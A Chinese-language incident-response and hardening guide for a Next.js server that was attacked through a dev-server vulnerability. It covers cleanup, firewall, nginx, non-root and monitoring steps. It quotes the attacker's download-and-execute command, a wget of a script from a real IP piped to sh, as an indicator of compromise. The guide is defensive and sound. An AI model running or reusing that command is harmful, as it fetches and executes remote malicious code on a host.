# 安全加固指南

> ⚠️ **重要**: 如果你的服务器曾被攻击，请立即执行以下步骤

---

## 攻击事件分析

### 漏洞信息
- **影响版本**: Next.js 10.0.0 - 15.5.9
- **漏洞类型**: 开发服务器缺乏来源验证导致的信息泄露
- **CVE**: GHSA-3h52-269p-cp9r

### 攻击方式
攻击者利用 Next.js 开发服务器漏洞，通过构造特殊请求执行任意命令：
```bash
# 恶意命令示例
wget -qO- http://178.16.52.253/1utih | sh
```

---

## 紧急修复步骤

### 1. 立即检查服务器

```bash
# 检查可疑进程
ps aux | grep -E "(wget|curl|178\.16\.52)"

# 检查定时任务
crontab -l
cat /etc/crontab
ls -la /etc/cron.d/

# 检查启动项
ls -la /etc/systemd/system/
ls -la ~/.config/systemd/user/

# 检查 SSH 密钥
cat ~/.ssh/authorized_keys
```

### 2. 清理恶意程序

```bash
# 终止可疑进程
pkill -f "178.16.52"
pkill -f "1utih"

# 清理定时任务（仔细检查后再删除）
crontab -e

# 检查并删除可疑文件
find /tmp -name "*.sh" -mtime -7
find /var/tmp -name "*.sh" -mtime -7
```

### 3. 更新应用

```bash
cd /opt/artistic-nav
git pull
npm install next@latest
npm ci --omit=dev
npm run build
pm2 restart artistic-nav
```

---

## 安全加固措施

### 1. 生产环境配置

#### 禁用开发服务器功能

编辑 `.env`：
```bash
# 必须设置
NODE_ENV=production
NEXT_TELEMETRY_DISABLED=1

# 禁用源码映射（防止泄露代码）
GENERATE_SOURCEMAP=false
```

#### 配置 next.config.ts

```typescript
import type { NextConfig } from "next";

const nextConfig: NextConfig = {
  output: "standalone",
  
  // 禁用开发指示器
  devIndicators: false,
  
  // 禁用源码映射
  productionBrowserSourceMaps: false,
  
  // 配置安全响应头
  async headers() {
    return [
      {
        source: "/:path*",
        headers: [
          {
            key: "X-Frame-Options",
            value: "DENY",
          },
          {
            key: "X-Content-Type-Options",
            value: "nosniff",
          },
          {
            key: "Referrer-Policy",
            value: "strict-origin-when-cross-origin",
          },
        ],
      },
    ];
  },
};

export default nextConfig;
```

### 2. 防火墙配置

```bash
# 仅开放必要端口
ufw default deny incoming
ufw default allow outgoing
ufw allow 22/tcp      # SSH
ufw allow 80/tcp      # HTTP
ufw allow 443/tcp     # HTTPS
ufw enable

# 封禁恶意 IP
ufw deny from 178.16.52.253
```

### 3. Nginx 安全加固

```nginx
server {
    listen 80;
    server_name _;
    
    # 限制请求体大小
    client_max_body_size 50M;
    
    # 安全响应头
    add_header X-Frame-Options "DENY" always;
    add_header X-Content-Type-Options "nosniff" always;
    add_header X-XSS-Protection "1; mode=block" always;
    add_header Referrer-Policy "strict-origin-when-cross-origin" always;
    
    # 禁用不必要的方法
    if ($request_method !~ ^(GET|HEAD|POST|PUT|DELETE|OPTIONS)$ ) {
        return 444;
    }
    
    location / {
        proxy_pass http://localhost:3000;
        proxy_http_version 1.1;
        proxy_set_header Upgrade $http_upgrade;
        proxy_set_header Connection 'upgrade';
        proxy_set_header Host $host;
        proxy_set_header X-Real-IP $remote_addr;
        proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for;
        proxy_set_header X-Forwarded-Proto $scheme;
        proxy_cache_bypass $http_upgrade;
        
        # 超时设置
        proxy_connect_timeout 60s;
        proxy_send_timeout 60s;
        proxy_read_timeout 60s;
    }
    
    # 禁止访问敏感文件
    location ~ /\. {
        deny all;
        return 404;
    }
    
    location ~ ^/(\.env|\.git|\.ssh) {
        deny all;
        return 404;
    }
}
```

### 4. 使用非 root 用户运行

```bash
# 创建专用用户
useradd -r -s /bin/false artistic-nav

# 设置权限
chown -R artistic-nav:artistic-nav /opt/artistic-nav

# 使用 PM2 以非 root 运行
pm2 start npm --name "artistic-nav" -- run start --user artistic-nav
```

### 5. 定期安全扫描

```bash
# 安装 ClamAV
apt-get install -y clamav clamav-daemon
freshclam

# 全盘扫描
clamscan -r / --exclude-dir="^/sys" --exclude-dir="^/proc" --log=/var/log/clamav/scan.log

# 安装 Rootkit 检测器
apt-get install -y rkhunter
rkhunter --check
```

---

## 监控告警

### 1. 进程监控脚本

```bash
#!/bin/bash
# /opt/artistic-nav/security-monitor.sh

# 检查可疑进程
SUSPICIOUS=$(ps aux | grep -E "(wget|curl).*http" | grep -v grep)
if [ ! -z "$SUSPICIOUS" ]; then
    echo "[ALERT] 发现可疑进程: $SUSPICIOUS" | logger -t security-alert
    # 发送邮件或钉钉通知
fi

# 检查异常网络连接
NETSTAT=$(netstat -tn 2>/dev/null | grep ESTABLISHED | wc -l)
if [ "$NETSTAT" -gt 100 ]; then
    echo "[ALERT] 异常连接数: $NETSTAT" | logger -t security-alert
fi
```

添加到定时任务：
```bash
crontab -e
# 每5分钟检查一次
*/5 * * * * /opt/artistic-nav/security-monitor.sh
```

---

## 最佳实践

1. **永远不要**在生产环境运行 `next dev`
2. **定期更新**依赖包，关注安全公告
3. **使用 HTTPS**，配置 HSTS
4. **定期备份**数据库和配置文件
5. **启用 2FA** 保护服务器登录
6. **限制 SSH** 仅允许密钥登录，禁用密码
7. **监控日志** /var/log/nginx/ 和 PM2 日志

---

## 紧急联系方式

如发现安全问题：
1. 立即断开服务器网络
2. 备份日志文件
3. 重装系统（严重情况下）
4. 报告给 security@your-domain.com
